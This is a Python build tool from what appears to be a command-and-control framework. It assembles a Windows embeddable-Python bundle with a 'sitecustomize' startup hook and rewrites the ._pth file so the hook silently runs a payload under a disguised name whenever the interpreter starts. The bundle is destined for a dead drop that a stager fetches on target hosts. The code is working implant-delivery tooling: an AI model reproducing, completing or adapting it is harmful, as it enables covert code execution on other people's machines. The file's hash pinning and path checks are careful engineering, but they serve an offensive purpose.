#!/usr/bin/env python3
"""Assemble a brought-interpreter bundle, and print what to paste.

A host with no usable Python gets one brought to it: the official Windows
embeddable distribution, laid out with the startup hook in its own `Lib/`
and the build's payload beside the executable. This tool takes the pinned
distribution and those two generated files, writes one zip, and prints
the `{url, sha256}` entry the operator pastes into the build's drop list
once they have uploaded it.

**It uploads nothing and it knows no location.** That is the scope the
design chose -- build locally, upload by hand -- and the alternative, a
build-and-publish pipeline with revocation on the team server, was
declined as comparable in size to the tunnel server itself. So there is
no network call here, not an optional one; `test_no_upload_is_attempted`
reads this module's own imports and holds that.

**The distribution is verified before it is opened, not afterwards.** The
whole chain rests on one pinned hash: the stager fetches this bundle from
a drop and refuses it unless it matches the hash printed below, and this
tool refuses the upstream distribution unless it matches the hash the
operator pinned. A tool that unzips first and verifies second has
already parsed attacker-controlled input, so the digest is taken over the
closed file and compared before `zipfile` sees it, and nothing is written
anywhere until every member is assembled in memory.

**The `._pth`, which is where this feature most easily dies quietly.**
The official embeddable distribution ships a `python<XY>._pth` whose
`import site` line is commented out, and `site` is what imports
`sitecustomize`. Where that holds, the hook is never imported and the
mechanism is silently dead with every file in the right place. So this
tool rewrites that file, and it recognises exactly two shapes:

  * a line that is already `import site` -- left as it is;
  * a commented one, which is what the distribution ships -- uncommented.

Anything else is refused, naming the file and the lines it found. A
`._pth` of a shape this tool has never seen is a distribution whose
layout assumptions want re-checking by a person, and appending to it
blindly would produce a bundle that looks built and does nothing.

The same rewrite also puts `Lib` on the path. An `._pth` replaces
`sys.path` wholesale, and the distribution's own lists only
`python<XY>.zip` and `.` -- so `site` would look for `sitecustomize`
beside the executable and never in `Lib/`, where the hook has to be
because that is the directory it walks up from to find the payload.
Both halves of this are pending verification on a real Windows host
against the exact pinned distribution, which is a later task; what this
tool does is make the assumption explicit and fail loudly rather than
quietly where it does not hold.

**Reproducible, so two operators can compare.** Entries are sorted by
name, every one carries the same fixed timestamp and the same mode,
directory entries are not written at all, and each `ZipInfo` is built
fresh instead of being carried over from the distribution -- so none of
the source archive's extra fields, host attributes or timestamps reach
the output.

**The limit of that, stated rather than implied.** What is pinned here is
the archive: its member list, their names, their order, their timestamps,
their modes and their contents, and the deflate level. What is not pinned
is the deflate stream itself, which belongs to zlib: a build against a
differently compressing zlib -- zlib-ng is the live case -- can produce a
different bundle from byte-identical inputs. The consequence is a false
alarm between two operators comparing hashes, and nothing more. It is
never a weakening of what the stager verifies, because the stager
verifies the hash of the file the operator actually uploaded, which this
tool computes over the file it has just written. `ZIP_STORED` would
remove even the false alarm, at the cost of roughly doubling a dead drop
that is already about 11 MB, and that is the wrong trade for a
convenience cross-check.

    python3 tools/build_interpreter_bundle.py \\
        --distribution python-3.11.9-embed-amd64.zip \\
        --expect-sha256 <the hash published for that file> \\
        --payload artifact.py --payload-name runtime9c21.py \\
        --base-dir support4f2a --out bundle.zip
"""

import argparse
import hashlib
import json
import pathlib
import posixpath
import re
import sys
import zipfile

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from software.c2.stagers.startup_hook import render_sitecustomize

# The directory inside the interpreter root that the hook lives in, and
# the name `site` imports it under. Both are fixed by the renderer: the
# hook finds the payload two `dirname` levels up from its own `__file__`,
# so moving it would point it at the wrong directory.
HOOK_DIR = "Lib"
HOOK_NAME = "sitecustomize.py"

# The line in the `._pth` that decides whether any of this runs.
IMPORT_SITE = "import site"

# What makes the archive reproducible. 1980-01-01 is the earliest a DOS
# timestamp can express, which is what `zipfile` itself uses when no date
# is given; the mode is a plain read-write file, which is not meaningful
# on the Windows host this distribution is for and is fixed so that the
# operator's umask cannot reach the archive; and `create_system` is set
# rather than inherited from whichever OS the operator builds on.
_FIXED_DATE_TIME = (1980, 1, 1, 0, 0, 0)
_FIXED_MODE = 0o644
_FIXED_CREATE_SYSTEM = 3
_COMPRESS_LEVEL = 9

# The operator replaces this once the file is uploaded. It is not a URL
# because this tool knows none, and a plausible-looking default would be
# a location somebody eventually failed to replace.
URL_PLACEHOLDER = "PASTE-THE-LOCATION-YOU-UPLOADED-IT-TO"

_SHA256 = re.compile(r"^[0-9a-f]{64}$")

# One path component, of the shape the generator mints. The payload name
# is held to the same shape by `render_sitecustomize`, for its own reason
# -- the hook joins it to a directory. This one is the archive's single
# top-level directory, and a name with a separator or a leading dot in it
# would put the layout somewhere the stager did not ask for.
_PLAIN_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")


def sha256_file(path, chunk=1 << 20) -> str:
    """The SHA-256 of a file, read in chunks rather than loaded."""
    digest = hashlib.sha256()
    with open(str(path), "rb") as handle:
        for block in iter(lambda: handle.read(chunk), b""):
            digest.update(block)
    return digest.hexdigest()


def verify_distribution(path, expect_sha256: str) -> str:
    """Refuse `path` unless it hashes to `expect_sha256`. No override.

    Called while the file is still closed, which is the whole point of
    it: see the module docstring. Returns the digest so the caller can
    report the pin it verified.
    """
    expected = (expect_sha256 or "").strip().lower()
    if not _SHA256.match(expected):
        raise ValueError(
            "--expect-sha256 must be 64 hex digits, not %r: the "
            "pinned hash of the upstream distribution is the only thing "
            "this build trusts and there is no way to skip it"
            % (expect_sha256,))

    found = sha256_file(path)
    if found != expected:
        raise ValueError(
            "%s does not match the pinned hash: expected %s, found %s. "
            "Its zip was not parsed and nothing was written -- re-download "
            "the distribution, or correct the pin."
            % (path, expected, found))
    return found


def adjust_pth(text: str, name: str) -> str:
    """Make the `._pth` import `site` and put the hook's directory on it.

    Two shapes are recognised and anything else is refused; the module
    docstring says why. Line endings are whatever the file already used,
    so the result stays byte-for-byte predictable from the input.
    """
    newline = "\r\n" if "\r\n" in text else "\n"
    lines = text.splitlines()

    rewritten = []
    imports_site = False
    for line in lines:
        bare = line.strip()
        if bare == IMPORT_SITE:
            imports_site = True
            rewritten.append(line)
            continue
        if bare.startswith("#") and bare.lstrip("#").strip() == IMPORT_SITE:
            imports_site = True
            rewritten.append(IMPORT_SITE)
            continue
        rewritten.append(line)

    if not imports_site:
        raise ValueError(
            "%s neither imports site nor carries a commented \"%s\" line, "
            "which are the only two shapes this tool was written against. "
            "Its lines are %r. Refusing rather than appending to a file "
            "whose shape is not the one expected: without site, the hook in "
            "%s/ is never imported and the bundle does nothing."
            % (name, IMPORT_SITE, _summarise(lines), HOOK_DIR))

    if not any(_is_hook_dir(line) for line in rewritten):
        rewritten.append(HOOK_DIR)

    return newline.join(rewritten) + newline


def _is_hook_dir(line: str) -> bool:
    """Whether this line already has the hook's directory on the path."""
    return line.strip().replace("\\", "/").rstrip("/") == HOOK_DIR


def _summarise(lines, limit=12):
    """The file's lines, enough of them to recognise it by."""
    if len(lines) <= limit:
        return lines
    return lines[:limit] + ["... %d more lines" % (len(lines) - limit,)]


def build_bundle(distribution_zip, payload_source, *, base_dir,
                 payload_name=None, gate="path", out_path, expect_sha256):
    """Write the bundle and return `{"path", "sha256", "entry"}`.

    `expect_sha256` is required and keyword-only, and the reason it is
    here rather than only on the command line is that hash verification
    is mandatory with no override: a caller that could reach this
    function without a pin would be the override. The plan's interface
    line did not list it because it put the flag on the CLI; the check
    belongs where the file is opened.

    `payload_name` is the name the payload lands under -- the one the
    build generated and the one the hook looks for -- and defaults to the
    name the file already has on the operator's disk.
    """
    if not _PLAIN_NAME.match(base_dir or ""):
        raise ValueError(
            "base_dir must be one plain directory name made of letters, "
            "digits, dot, dash and underscore, not %r: it is the archive's "
            "only top-level directory" % (base_dir,))

    payload_path = pathlib.Path(str(payload_source))
    payload_name = payload_name or payload_path.name

    # Checked here as well as by `render_sitecustomize`, which holds the
    # name to the same shape for its own reason. The renderer's regex is
    # not this tool's archive-path safety: a later relaxation of it would
    # loosen these member names with nothing here noticing. The two
    # reserved names below are the reason this block is one place rather
    # than spread between here and the collision check: everything the
    # payload may not be called is in front of whoever relaxes one of
    # them, and all of it refuses before 11 MB is read and hashed.
    if not _PLAIN_NAME.match(payload_name):
        raise ValueError(
            "payload_name must be one plain file name made of letters, "
            "digits, dot, dash and underscore, not %r: it becomes a member "
            "name in the archive the stager unpacks" % (payload_name,))
    if payload_name == HOOK_DIR:
        raise ValueError(
            "payload_name may not be %r: that is the directory the hook "
            "goes in, so the archive would carry a file and a directory "
            "under one name and would not extract on the target"
            % (HOOK_DIR,))
    if payload_name == HOOK_NAME:
        raise ValueError(
            "payload_name may not be %r: the rewritten ._pth puts the "
            "interpreter root on the path ahead of %s/, so `site` would "
            "import the payload under that name and the real hook would "
            "never run -- the bundle would look built and do nothing"
            % (HOOK_NAME, HOOK_DIR))

    # Rendered after the name is validated, and before anything is read:
    # it validates the gate, so a build that could not produce a working
    # hook fails before it reads 11 MB and hashes it.
    hook = render_sitecustomize(payload_name, gate)

    verify_distribution(distribution_zip, expect_sha256)
    payload = payload_path.read_bytes()

    members = {}
    with zipfile.ZipFile(str(distribution_zip)) as distribution:
        infos = [info for info in distribution.infolist() if not info.is_dir()]
        for info in infos:
            _check_member_name(info.filename, distribution_zip)
            if info.filename in members:
                raise ValueError(
                    "%s carries more than one member named %r, and one of "
                    "them would be dropped from the bundle rather than "
                    "refused" % (distribution_zip, info.filename))
            # Read through the ZipInfo rather than the name: with a
            # duplicated member name, the name-to-info map resolves to
            # the last occurrence, so reading by name would hand back
            # the same bytes for every one of them.
            members[info.filename] = distribution.read(info)

    pth_names = sorted(name for name in members
                       if "/" not in name and name.endswith("._pth"))
    if len(pth_names) != 1:
        raise ValueError(
            "%s carries %d files named *._pth at its root (%s); the "
            "embeddable distribution carries exactly one, and it is the "
            "file that decides whether the hook is imported at all"
            % (distribution_zip, len(pth_names),
               ", ".join(pth_names) or "none"))

    pth_name = pth_names[0]
    try:
        pth_text = members[pth_name].decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ValueError(
            "%s in %s is not text this tool can read (%s), so its shape "
            "cannot be checked" % (pth_name, distribution_zip, exc))
    members[pth_name] = adjust_pth(pth_text, pth_name).encode("utf-8")

    hook_member = posixpath.join(HOOK_DIR, HOOK_NAME)
    for generated in (hook_member, payload_name):
        if generated in members:
            raise ValueError(
                "%s already carries %s, which this build has to write; "
                "refusing rather than replacing a file the distribution "
                "shipped" % (distribution_zip, generated))
    members[hook_member] = hook.encode("utf-8")
    members[payload_name] = payload

    laid_out = {posixpath.join(base_dir, name): data
                for name, data in members.items()}

    # Staged and renamed, so a bundle on disk is either complete or
    # absent: an interrupted write that left a short file under the
    # operator's chosen name is the one shape nobody would re-check. The
    # rename is inside the guard too -- a directory in the way, a
    # cross-device destination or a permission refusal all fail there,
    # and a `.partial` left behind is litter the operator did not ask for.
    staged = pathlib.Path("%s.partial" % (out_path,))
    try:
        _write_reproducible_zip(staged, laid_out)
        staged.replace(str(out_path))
    except Exception:
        if staged.exists():
            staged.unlink()
        raise

    digest = sha256_file(out_path)
    return {"path": str(out_path), "sha256": digest,
            "entry": json.dumps({"url": URL_PLACEHOLDER, "sha256": digest})}


def _check_member_name(name: str, source) -> None:
    """Refuse a member that would not stay inside the laid-out directory.

    The distribution is pinned by hash, so this is belt and braces -- but
    the stager unpacks what comes out of here, and a member that escaped
    would escape on the target rather than on the operator's machine.
    """
    bad = (name.startswith("/") or name.startswith("\\") or "\\" in name
           or ".." in name.split("/") or ":" in name)
    if bad:
        raise ValueError(
            "%s carries a member named %r, which would not stay inside the "
            "laid-out directory when the stager unpacks it"
            % (source, name))


def _write_reproducible_zip(out_path, members) -> None:
    """One file entry per member, sorted, with every varying field fixed."""
    with zipfile.ZipFile(str(out_path), "w", zipfile.ZIP_DEFLATED) as out:
        for name in sorted(members):
            info = zipfile.ZipInfo(name, date_time=_FIXED_DATE_TIME)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.create_system = _FIXED_CREATE_SYSTEM
            info.external_attr = _FIXED_MODE << 16
            out.writestr(info, members[name], compresslevel=_COMPRESS_LEVEL)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Assemble a brought-interpreter bundle. Uploads nothing.")
    parser.add_argument("--distribution", required=True,
                        help="the pinned embeddable distribution zip")
    parser.add_argument("--expect-sha256", required=True,
                        help="its published hash; verified before it is "
                             "opened, and there is no way to skip it")
    parser.add_argument("--payload", required=True,
                        help="the generated artifact to lay beside the "
                             "interpreter")
    parser.add_argument("--out", required=True,
                        help="where to write the bundle")
    parser.add_argument("--base-dir", required=True,
                        help="the build's generated layout directory, which "
                             "is the archive's one top-level directory")
    parser.add_argument("--payload-name", default=None,
                        help="the build's generated payload name; defaults "
                             "to the name --payload already has")
    parser.add_argument("--gate", default="path", choices=("path", "argc"),
                        help="which startup gate the hook carries "
                             "(default: path)")
    args = parser.parse_args(argv)

    try:
        result = build_bundle(args.distribution, args.payload,
                              base_dir=args.base_dir,
                              payload_name=args.payload_name,
                              gate=args.gate, out_path=args.out,
                              expect_sha256=args.expect_sha256)
    except (ValueError, OSError) as exc:
        print("refused: %s" % (exc,), file=sys.stderr)
        return 1

    # The pin, normalised, and it is a fact rather than a claim: the
    # build above refuses to proceed unless the file hashed to it.
    print("distribution verified against its pin: %s"
          % (args.expect_sha256.strip().lower(),))
    print("wrote %s" % (result["path"],))
    print("bundle sha256: %s" % (result["sha256"],))
    print("")
    print("Upload it, replace the placeholder, and paste this into the "
          "build's drop list:")
    print(result["entry"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
